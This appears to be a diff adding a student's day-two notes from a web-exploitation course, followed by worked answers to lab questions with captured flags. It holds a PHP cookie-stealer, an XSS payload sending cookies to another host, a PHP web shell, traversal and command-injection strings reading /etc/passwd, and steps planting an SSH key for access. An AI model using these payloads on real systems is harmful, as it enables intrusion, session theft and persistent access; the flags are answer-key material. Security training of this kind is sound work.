@@ -1,0 +1,271 @@
+#DAY 2 security notes:
+
+_____________________________________________________________________________________
+
+#WEB EXPLOITATION (XSS)
+
+#HTTP:
+	
+	methods:
+		
+		*POST
+		*GET
+		HEAD
+		Put
+		
+	tools to use that can retreive the header:
+		
+		tcpdump
+		wireshark
+
+	HTTP Response Codes
+
+		10X == Informational
+		2XX == Success
+		30X == Redirection
+		4XX == Client Error
+		5XX == Server Error
+
+		on windows hit f12 to get dev box see alot of information
+		network monitors http traffic see all th e details includes
+		user-agent 
+
+	HTTP Fields
+
+
+    		Host - the domain name of the server being requested. 			"example.com" — This is especially relevant in 			servers that host multiple domains, or "virtual 				hosts."
+
+    		User-Agent - an identifier for the web browser. "Mozilla/5.0 			(X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 				Firefox/62.0"
+
+    		Referer - the URI that of the web page that referred the 				browser to the current request. 				"https://www.google.com/"
+
+    		Accept-Language - the language that the browser will 			reqeust. "en-US,en"
+
+    		Accept - the type of content the browser supports accepting. 			"text/html"
+
+    		Cookie - the cookie values associated with the request. 				These are usually set by the server in a response 				first and then returned in subsequent requests to 				allow the server to track state across multiple 				requests. "session=4ea45745732f14792ca80c3ef73b69c9"
+
+    		Content-Length - the number of octets transmitted in the 				request body. "19"
+
+_______________________________________________________________________________
+#JAVASCRIPT
+
+	website enumeration:
+	
+		/robots.txt
+		/java
+
+	through cli no webpage enum: (alt for robots.txt)
+	
+	 	sudo apt install nikto -y
+	 	nikto -h 10.50.40.14 <-- more in depth info 
+	 	can use nmap -http-enum.nse 
+	 	
+_________________________________________________________________________________
+
+
+#Cross-Site Scripting (XSS)
+
+	insertion of code in webpage that executes code to client or something
+	untrusted ode on trusted website server being misconfigured allows code 
+	to be executed allow java script to operate on that website.
+	
+
+	Reflected XSS:
+	
+		malcious link tiny url 
+		not persistent server as proxy for exploit 
+		can base64 url or sccript to obsucate it
+		
+	Stored XSS	
+		<ip>/chat/messageb.php
+		create cookie stealer code to steal cookie
+		
+		 
+		vim cookie.php
+	
+		<?php
+		$cookie = $_GET["username"];
+		$steal = fopen("/var/www/html/cookiefile.txt", "a+");
+		fwrite($steal, $cookie ."\n");
+		fclose($steal);
+		?>
+
+		cookie
+		<script>document.location="http://10.50.28.10/	 
+		Cookie.php?username=" + document.cookie;</script>
+		
+		break website 
+		python server to ctach that cookie session hijacking 
+
+	
+		keystroke logging payload  
+		
+		
+____________________________________________________________________________________
+#SEVER_SIDE INJECTION (URL, UPLOAD):
+__________________________________________________________________________________
+	
+#Directory tranversing 
+	
+		POST:
+		<ip>/path/pathdemo.php
+		../../../../../etc/passwd
+				etc/host
+		
+		
+		GET:
+		http:<ip>/<paht>myfile=../../../../etc/paswd
+
+#Maclious file upload 
+
+		open notepad copy script 
+		save as bad.php
+		upload file 
+		 <HTML><BODY>
+		  <FORM METHOD="GET" NAME="myform" ACTION="">
+		  <INPUT TYPE="text" NAME="cmd">
+		  <INPUT TYPE="submit" VALUE="Send">
+		  </FORM>
+		  <pre>
+		  <?php
+		  if($_GET['cmd']) {
+		    system($_GET['cmd']);
+		    }
+		  ?>
+		  </pre>
+		  </BODY></HTML>
+		navigate back to upload from <ip>/fileuploads.php to uploads
+		bad.php click on it 
+		whoami www-data <-- root user of server 
+		command shell 
+		
+		
+#Command injection 
+	
+		input received by user 
+		/cmdinjection/ ;whoami ;cat /etc/passwd 
+
+#public ss key to web 
+	
+		ssh through it using public key without creds 
+		
+		/uploads/
+		
+		whoami  <-- that user find out user home dir /etc/passwd 
+		www-data 
+		cat /etc/passwd for www-data /var/www <-- .ssh in user home direct
+		ls -la /var/www <--- no ssh directory create it
+		mkdir /var/www/.ssh 
+		ls -la  /var/www
+		write our key in there .ssh 
+		generate key <--linux-ops
+		ssh-keygen -t rsa 
+		cat /home/student/.ssh/id_rsa.pub ,--paste that whole key in there
+		echo <publickey> >> /var/www/.ssh/authorized_keys 
+		cat /var/www/.ssh/authorzied_keys
+		ssh www-data@<ip>
+		
+______________________________________________________________________________________-
+
+
+#DAY 2 ACTIVITIES WEB EXPLOITATION
+
+scheme of Maneuver
+jump box
+T1 10.100.28.40
+Donovian_MI_websvr
+
+
+
+q1.We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.
+
+		press the motherfucking f12 change the condition of the buton that 			it does the win button one 
+		2mMcVM5aQZSlaKMl5Yh3
+		
+
+		
+q2.Through website reconnaissance, what is Romanoff's email address?
+
+		ssh -MS /tmp/jump student@10.50.20.233
+		ssh -S /tmp/jump -O forward -D 9050 dummy
+		proxychains nmap -Pn 10.100.28.40 -T4 -p1-10000
+		80 4444 
+		ssh -S /tmp/jump -O forward -L1110:10.100.28.40:80 DUMB
+		ssh -S /tmp/jump -O forward -L1120:10.100.28.40:4444 DUMB
+		firefox http://127.0.0.1:80
+		http://127.0.0.1:1110/net_test/industry_check.php
+		http://127.0.0.1:1110/TT/ticket.php <-- contract_bids in there 
+		http://127.0.0.1:1110/Contract_bids.html<-put contractnbids in url 
+		N.Romanoff@MI.ru. 
+		
+q3.Having the ability to now communicate with the training web site, identify any vulnerabilities that could lead to intelligence collection.Once identified utilize that vulnerability to obtain the flag from where information about user is configured on the system.Directory Traversal
+
+		after setting to the tunnel to billybob and then another to the 
+		training website though billybob device the 10.100.28.55
+		ssh -S /tmp/T1 -O forward -L1140:10.100.28.55:80 dumb
+		http:/127.0.0.1:1140
+		http://127.0.0.1:1140/books_pick.php?				 			book=../../../../../../../../../etc/passwd
+		mMrl9KT71WmgE7Cjdesm 
+		
+
+
+
+
+q4.Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload
+
+		http://127.0.0.1:1110/Contract_bids.html
+		*malicous file upload*
+		upload bad.php
+		go to /uploads click on it 
+		cat  /home/romanoff@mi.ru/contracts
+		d3F34R8BCtAadZsfi7El
+		
+	
+	
+q5.Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.
+
+		set up forward tunnel  using multiplexing to billybob 
+		*follow ssh into public key steps* <-- using bad.php exploit 
+		cd to where the troubleshooter is 
+		cd /var/www/html/TT <-- on the billybob
+		cat ticket.php
+		says COOKIE: 
+		bOaBMwVOe66iTlgNUxWi
+		http://127.0.0.1:1110/uploads/
+		
+		<?php
+		$cookie = $_GET["username"];
+		$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+		fwrite($steal, $cookie ."\n");
+		fclose($steal);
+		?>
+		
+		upload file cookie.php
+		http://127.0.0.1:1110/TT/ticket.php
+		
+		<script>document.location="http://10.100.28.40/uploads/	 
+		Cookie.php?username=" + document.cookie;</script>
+		COOKIE=bOaBMwVOe66iTlgNUxWi; PHPSESSID=aqtettc6tacmd5qeuak102e5cg
+		cookies are alwsy at top tenscbusch
+		
+q6.Identify the user that the MI website is running as and relevant information about their user account configuration.
+
+		http://127.0.0.1:1110/net_test/industry_check.php	
+		;whoami
+		billybob billybob
+		;cat /etc/passwd
+		E5LLcvL83rOdKDJary7y
+
+q7.What is the IPv4 address of the Training Site website?
+
+		10.100.28.55 <-- /uploads/message 
+		
+q8.Gain initial access to the web server located at 10.100.28.40. What is the greeting when logging into the system?
+
+		set up intial access in question 5 
+		look at the message once intial access kaak ssh in 
+		NWebwh3iFVk8cSK3lAy7
+
+
+_________________________________________________________________________________
